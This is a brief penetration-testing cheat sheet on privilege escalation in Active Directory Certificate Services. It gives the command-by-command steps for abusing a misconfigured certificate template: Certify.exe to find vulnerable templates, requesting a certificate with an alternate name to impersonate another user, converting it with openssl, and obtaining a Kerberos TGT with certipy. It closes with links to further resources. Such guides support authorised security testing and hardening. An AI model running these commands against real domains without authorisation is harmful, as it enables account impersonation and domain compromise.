---
description: A list of LDAP Privileges Escalation Techniques.
---

# LDAP - Privileges Escalation

## ADCS: Active Directory Certificate Services

A list of privileges techniques for ADCS.

### Certificate Template Exploit

Certificate templates in **ADCS** (Active Directory Certificate Services) are pre-configured templates that define the parameters for a particular type of certificate that can be issued by the certificate authority (CA).

We can use [Certify.exe](https://github.com/GhostPack/Certify) to find vulnerable certificate template.

```powershell
.\Certify.exe find /vulnerable
```

Request a new certificate with the vulnerable template and try to impersonate.

```powershell
.\Certify.exe request /ca:<AD-CA_name> /template:<Template_name> /altname:<user_you_want_to_impersonate>
```

This will produce a `cert.pem`. Use `openssl` to convert it into `.pfx`.

```bash
# get cert.pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Now ask the TGT using [Certipy](https://github.com/ly4k/Certipy).

```bash
certipy auth -pfx cert.pfx -dc-ip <DC_IP> -u '<user_you_want_to_impersonate>' -domain <domain_name>
```

> :bulb:You can find more information about this subject at links below:
>
> * [0xalwayslucky Gitbook](https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates)
> * [Hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)

### ADCS privesc Ressources

* [Hacktricks Books ADCS section](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation) ;
* [Certify](https://github.com/GhostPack/Certify): tool to enumerate and abuse misconfigurations in ADCS ;
* [PKINITools](https://github.com/dirkjanm/PKINITtools): some utilities for playing with PKINIT and certificates.

